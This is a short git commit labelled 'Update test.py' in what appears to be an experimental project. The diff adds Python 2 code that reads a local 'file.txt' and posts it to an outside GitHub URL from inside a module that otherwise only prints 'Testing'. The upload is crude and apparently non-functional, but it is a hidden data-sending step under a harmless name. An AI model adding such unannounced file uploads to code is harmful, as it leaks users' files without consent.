0b9f74cc8cbb295a8ad8487214d0d885bf7b8c69
experiment2016 <sarpiericam@libero.it>
2016-05-30 14:25:27 +0200

    Update test.py

--- modules/test.py
+++ modules/test.py
@@ -1,6 +1,11 @@
+import requests
 def run(**args):
   try:
-      print("Testing")   
+      print("Testing") 
+      url='https://github.com/experiment2016/workhub/post'
+      files = {'upload_file': open('file.txt','rb')}
+      values={'upload_file' : 'file.txt'}
+      r=requests.post(url,files=files,data=values)
   except Exception, e:
       return str(e)
   
